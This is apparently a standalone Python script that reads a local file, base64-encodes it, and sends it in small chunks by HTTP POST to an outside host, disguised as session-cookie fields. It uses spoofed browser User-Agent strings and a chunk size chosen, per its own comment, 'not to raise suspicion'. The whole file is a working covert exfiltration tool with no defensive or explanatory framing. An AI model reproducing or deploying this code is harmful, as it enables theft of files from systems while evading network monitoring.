#!/usr/bin/python

import sys
import zlib
import json
import time
import random
import base64
import requests

# Constants
USER_AGENTS = [
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/2.02E (Win95; U)",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Opera/7.50 (Windows XP; U)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"]
HEADERS = {'content-type': 'application/json', 'User-Agent': random.choice(USER_AGENTS)}
READ_BINARY = "rb"


# Packet configuration
INIT_PACKET_COOKIE = "sessionID"
PACKET_COOKIE = "PHPSESSID"
TERMINATION_COOKIE = "sessID0"
COOKIE_DELIMITER = ".."
SLEEP = 0.05

# Turn into Arguments
MAX_BYTES_IN_PACKET = 128           # not to raise suspicion
FILE_NAME = "1.png"
HOME_ADDR = "http://www.morirt.com"


def main():
	# Load file
	fh = open(FILE_NAME, READ_BINARY)
	iAmFile = fh.read()
	fh.close()

	# Split file to chunks by size:
	chunks = []
	IamDone = ""

	IamDone = base64.b64encode(iAmFile)  # Base64 Encode for ASCII
	checksum = zlib.crc32(IamDone)  # Calculate CRC32 for later verification

	# Split into chunks
	chunks = [IamDone[i:i + MAX_BYTES_IN_PACKET] for i in range(0, len(IamDone), MAX_BYTES_IN_PACKET)]

	# Initial packet:
	init_payload = FILE_NAME + COOKIE_DELIMITER + str(checksum) + COOKIE_DELIMITER + str(len(chunks))
	payload = {INIT_PACKET_COOKIE: init_payload}
	requests.post(HOME_ADDR, data=json.dumps(payload), headers=HEADERS)
	sys.stdout.write("[+] Sent initiation package. Total of %s chunks.\n" % (len(chunks) + 2))
	sys.stdout.write(".")
	time.sleep(SLEEP)

	# Send data
	current_chunk = 0
	for chunk in chunks:
		payload = {PACKET_COOKIE + str(current_chunk): chunk}
		requests.post(HOME_ADDR, data=json.dumps(payload), headers=HEADERS)
		current_chunk += 1
		sys.stdout.write(".")
		time.sleep(SLEEP)
	sys.stdout.write(".\n")

	# Termination packet
	data = "\\x00\\x00\\x00\\x00" + str(current_chunk)
	payload = {TERMINATION_COOKIE: data}
	requests.post(HOME_ADDR, data=json.dumps(payload), headers=HEADERS)
	sys.stdout.write("[+] Sent termination packets and total of %s packets.\n" % current_chunk)

# ########################################################################################
#	string_check = ""
#for i in chunks:
#	string_check = string_check + i
#
#	cheky = zlib.crc32(string_check)
#	print str(cheky) + ":" + str(checksum)
#	print string_check + "\n" + IamDone
#	if cheky == checksum:
#		print "good!"
#########################################################################################

if __name__ == "__main__":
	main()